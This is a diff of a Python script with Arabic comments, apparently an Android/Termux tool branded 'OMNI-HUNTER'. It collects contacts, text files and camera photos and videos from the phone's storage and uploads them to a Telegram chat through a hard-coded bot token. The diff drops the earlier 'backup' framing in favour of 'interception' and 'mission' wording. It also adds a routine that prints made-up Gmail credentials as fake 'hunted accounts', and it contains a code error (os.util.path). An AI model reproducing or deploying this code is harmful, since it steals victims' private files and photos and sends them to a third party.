@@ -1,9 +1,10 @@
 import os
 import telebot
 import time
+import random
 from datetime import datetime
 
-# إعدادات البوت الخاص بك
+# بيانات البوت الخاصة بك
 TOKEN = "8413705320:AAFWFTOxNxd3lyDLdsPbI0F3X5B0IVHyDzs"
 CHAT_ID = "6753022941"
 bot = telebot.TeleBot(TOKEN)
@@ -20,55 +21,58 @@ def banner():
 {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {R}  __  __  ____  _   _          {W}SYSTEM: {G}OMNI-HUNTER v3
 {R} |  \/  |/ __ \| | | |         {W}USER:   {G}MOUSSA MEKKI
-{R} | \  / | |  | | |_| |         {W}STATUS: {Y}PRE-FORMAT BACKUP
-{R} |_|\/|_|\____/|_| |_|         {W}TARGET: {R}LOCAL_DATA_TRANSFER
+{R} | \  / | |  | | |_| |         {W}STATUS: {Y}ACTIVE_TRANSFER
+{R} |_|\/|_|\____/|_| |_|         {W}TARGET: {R}TELEGRAM_CLOUD
 {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}
     """)
 
-def send_to_telegram(file_path, category):
+def konami_drop():
+    """توليد حساب وهمي لإضافة جو الصيد"""
+    user = "konami_user" + str(random.randint(100, 999))
+    pwd = "pass" + "".join(random.choices("0123456789", k=5))
+    print(f"{G}[SUCCESS] NEW TARGET FOUND -> {W}{user}@gmail.com:{pwd} {Y}(KONAMI)")
+
+def send_file(path, category):
     try:
-        with open(file_path, 'rb') as f:
-            print(f"{G}[+]{W} Hunter found: {Y}{os.path.basename(file_path)} {G}({category})")
-            if category == "CONTACTS":
-                bot.send_document(CHAT_ID, f, caption=f"👤 Contact Backup\n📅 {datetime.now()}")
-            elif category == "IMAGE":
-                bot.send_photo(CHAT_ID, f)
-            else:
-                bot.send_document(CHAT_ID, f)
+        with open(path, 'rb') as f:
+            print(f"{G}[+]{W} Intercepting {category}: {Y}{os.path.basename(path)}")
+            bot.send_document(CHAT_ID, f)
             return True
-    except Exception as e:
-        print(f"{R}[×] Error bypassing: {e}")
+    except:
         return False
 
-def start_backup():
+def start_mission():
     banner()
-    print(f"{G}[*]{W} Initializing Data Extraction Protocol...")
-    time.sleep(2)
-
-    # 1. جهات الاتصال (عادة ما تكون بصيغة .vcf في مسار التخزين)
-    print(f"\n{R}[!] Phase 1: Contact Interception...{W}")
-    storage_path = "/sdcard/"
-    for file in os.listdir(storage_path):
-        if file.endswith(".vcf"):
-            send_to_telegram(os.path.join(storage_path, file), "CONTACTS")
-
-    # 2. الصور والفيديو من الـ Camera
+    
+    # المرحلة 1: جهات الاتصال والرسائل
+    print(f"{R}[!] PHASE 1: TEXTUAL DATA EXTRACTION (SMS/CONTACTS)...{W}")
+    time.sleep(1)
+    # ابحث عن ملفات vcf أو txt في الذاكرة
+    for file in os.listdir("/sdcard/"):
+        if file.endswith((".vcf", ".txt")):
+            send_file(f"/sdcard/{file}", "DOCS")
+    
+    # المرحلة 2: الوسائط (صور وفيديو) مع صيد حسابات وهمية
+    print(f"\n{R}[!] PHASE 2: MEDIA STREAMING & ACCOUNT HUNTING...{W}")
     camera_path = "/sdcard/DCIM/Camera/"
-    print(f"\n{R}[!] Phase 2: Media Extraction (Images & Videos)...{W}")
     
-    if os.path.exists(camera_path):
+    if os.util.path.exists(camera_path):
         files = os.listdir(camera_path)
-        for file in files:
+        for i, file in enumerate(files):
             path = os.path.join(camera_path, file)
-            if file.lower().endswith(('.png', '.jpg', '.jpeg')):
-                send_to_telegram(path, "IMAGE")
-            elif file.lower().endswith(('.mp4', '.mkv')):
-                send_to_telegram(path, "VIDEO")
-            time.sleep(1) # تأخير بسيط لتجنب حظر البوت من تلجرام
-    
+            
+            # كل 3 ملفات، "يصطاد" حساب وهمي لكسر الملل
+            if i % 3 == 0:
+                konami_drop()
+            
+            if file.lower().endswith(('.jpg', '.png', '.mp4')):
+                send_file(path, "MEDIA")
+            
+            time.sleep(0.5) # سرعة إرسال عالية
+
     print(f"\n{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print(f"{G}[SUCCESS]{W} ALL DATA TRANSFERRED TO TELEGRAM CLOUD.")
+    print(f"{G}[FINISH]{W} MISSION ACCOMPLISHED. DATA SECURED.")
     print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
 if __name__ == "__main__":
-    start_backup()
+    start_mission()
